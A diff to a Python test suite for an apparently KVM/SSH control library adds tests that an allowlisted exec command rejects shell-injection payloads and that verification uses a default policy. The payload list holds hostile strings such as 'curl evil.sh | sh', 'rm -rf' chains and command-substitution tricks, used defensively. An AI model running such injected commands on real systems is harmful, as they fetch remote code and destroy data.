@@ -91,6 +91,26 @@ def test_exec_command_gated_allowlist():
     assert calls == ["uptime"]
 
 
+@pytest.mark.parametrize("command", [
+    "uptime ; rm -rf /tmp/pwned",
+    "uptime && curl evil.sh | sh",
+    "uptime | sh",
+    "uptime $(rm -rf /tmp/x)",
+    "uptime `whoami`",
+    "uptime\nrm -rf /tmp/y",
+])
+def test_exec_command_rejects_shell_injection_payloads(command):
+    calls = []
+    surf, _ = make_surface(
+        ssh_runner=lambda cmd: calls.append(cmd) or {"rc": 0},
+        ssh_allowlist=("uptime",),
+    )
+    surf.write_enabled = True
+    with pytest.raises(PolicyError):
+        surf.exec_command(command, transport="ssh")
+    assert calls == []
+
+
 def test_no_raw_arbitrary_api_requests():
     surf, _ = make_surface()
     assert not hasattr(surf, "raw_request")
@@ -162,3 +182,13 @@ def test_select_via_semantic_surface_records_state():
     assert out["operation"] == "select"
     assert out["evidence"]["machine"] == "pve2"
     assert out["evidence"]["state"] == "selected_unverified"
+
+
+def test_verify_uses_machine_default_policy(monkeypatch):
+    surf, _ = make_surface()
+    seen = []
+    monkeypatch.setattr("kvmctl.semantics.run_verify_policy",
+                        lambda policy, *args, **kwargs: (seen.append(policy) or (False, "no")))
+    surf.verify("kodi-build")
+    from kvmctl.machines import VerifyPolicy
+    assert seen == [VerifyPolicy.FRAME_CHANGE]
